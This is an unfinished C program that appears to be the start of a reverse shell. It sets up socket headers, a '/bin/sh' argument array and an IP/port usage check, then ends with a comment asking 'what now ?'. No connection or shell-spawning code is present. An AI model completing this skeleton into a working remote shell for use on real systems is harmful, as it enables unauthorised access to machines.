// *** I'm going to develop this myself. *** //

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>

int main(int argc, char *argv[]) {
    int sockfd;
    struct sockaddr_in server_addr;
    char *shell[] = {"/bin/sh", NULL};
    
    // Check arguments
    if (argc != 3) {
        printf("Usage: %s <IP> <PORT>\n", argv[0]);
        printf("Example: %s 127.0.0.1 4444\n", argv[0]);
        return 1;
    }
}
// what now ?